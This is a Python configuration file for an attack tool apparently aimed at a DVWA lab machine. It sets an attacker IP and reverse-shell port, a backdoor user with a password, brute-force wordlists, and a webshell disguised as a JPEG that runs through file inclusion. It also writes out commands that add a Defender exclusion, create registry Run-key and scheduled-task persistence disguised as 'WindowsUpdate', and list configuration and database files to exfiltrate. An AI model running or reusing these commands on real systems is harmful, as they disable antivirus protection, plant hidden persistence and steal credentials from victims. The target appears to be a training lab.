TARGET_IP = "172.28.121.248"
TARGET_PORT = 80
ATTACKER_IP = "172.28.121.166"
SHELL_PORT = 4444


NEW_USER = "attacker"
NEW_USER_PASSWORD = "P@ssw0rd123"


USERNAME_WORDLIST = "wordlists/usernames.txt"
PASSWORD_WORDLIST = "wordlists/passwords.txt"

DVWA_BASE_URL = f"http://{TARGET_IP}:{TARGET_PORT}/"
DVWA_LOGIN_URL = DVWA_BASE_URL + "login.php"
DVWA_FILE_UPLOAD_URL = DVWA_BASE_URL + "vulnerabilities/upload/"
DVWA_SECURITY_LEVEL_URL = DVWA_BASE_URL + "security.php"

WEBSHELL_FILENAME = "malware/shell.jpg"
WEBSHELL_UPLOADED_PATH = f"{DVWA_BASE_URL}/hackable/{WEBSHELL_FILENAME}"
WEBSHELL_URL = f"{DVWA_BASE_URL}/hackable/{WEBSHELL_FILENAME}"
DVWA_FILE_INCLUSION_URL = DVWA_BASE_URL + "vulnerabilities/fi/?page=file://C:/xampp/htdocs/hackable/uploads/shell.jpg"

ATTACK_LOG_FILE = "logs/attack_timeline.json"

EXCLUDE_COMMAND = "Powershell Add-MpPreference -ExclusionPath 'C:\\xampp\\htdocs\\hackable\\uploads'"
EXPLOIT_REGISTRY = "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /t REG_SZ /d \"powershell -WindowStyle Hidden C:/xampp/htdocs/hackable/uploads/putty_infected.exe\" /f"
SCHEDULE_TASK = f"schtasks /create /tn 'WindowsUpdate' /tr \"powershell -WindowStyle Hidden C:\\xampp\htdocs\hackable\\uploads\\update.ps1\" /sc onstart /ru {NEW_USER}"


EXILFTRATION_DATA = [
    "C:/xampp/htdocs/database/sqli.db",
    "C:/xampp/htdocs/config/config.inc.php",
]

TASK_NAME = "WindowsUpdate"
